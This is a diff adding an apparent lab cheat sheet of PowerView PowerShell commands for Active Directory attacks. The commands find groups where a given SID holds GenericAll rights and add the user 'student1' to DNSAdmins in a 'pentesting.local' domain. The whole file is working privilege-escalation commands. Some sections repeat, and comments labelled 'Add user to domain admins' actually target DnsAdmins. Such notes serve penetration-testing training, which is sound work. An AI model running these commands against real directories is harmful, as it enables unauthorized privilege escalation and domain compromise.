@@ -1,0 +1,21 @@
+#Security > Full Control
+
+#ACL - GenericAll on Group - DNSAdmin
+Get-DomainGroup -SamAccountName * | ? {($_.ActiveDirectoryRights -match 'GenericAll')}
+Get-DomainGroup -SamAccountName * | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+Get-DomainGroup -SamAccountName "DNSAdmins" | ? {($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+#Add user to domain admins
+Add-DomainGroupMember -Identity 'DnsAdmins' -Members 'student1'
+Get-DomainGroupMember -SamAccountName 'DnsAdmins'
+Get-ObjectAcl -ResolveGUIDs | ? {($_.objectdn -eq "CN=DNSAdmins,CN=Users,DC=pentesting,DC=local")}
+Get-ObjectAcl -SamAccountName "DNSAdmins" -ResolveGUIDs
+
+#First of, let's get its distinguishedName
+Get-DomainGroup -SamAccountName "DNSAdmins"
+Get-ObjectAcl -ResolveGUIDs | ? {($_.objectdn -eq "CN=DNSAdmins,CN=Users,DC=pentesting,DC=local") -and ($_.ActiveDirectoryRights -match 'GenericAll')}
+Get-ObjectAcl -ResolveGUIDs | ? {($_.objectdn -eq "CN=DNSAdmins,CN=Users,DC=pentesting,DC=local") -and ($_.ActiveDirectoryRights -match 'GenericAll') -and ($_.SecurityIdentifier -match 'S-1-5-21-1070240333-336889418-1185445934-1603')}
+
+#Add user to domain admins
+Add-DomainGroupMember -Identity 'DnsAdmins' -Members 'student1'
+Get-DomainGroupMember -SamAccountName 'DnsAdmins'
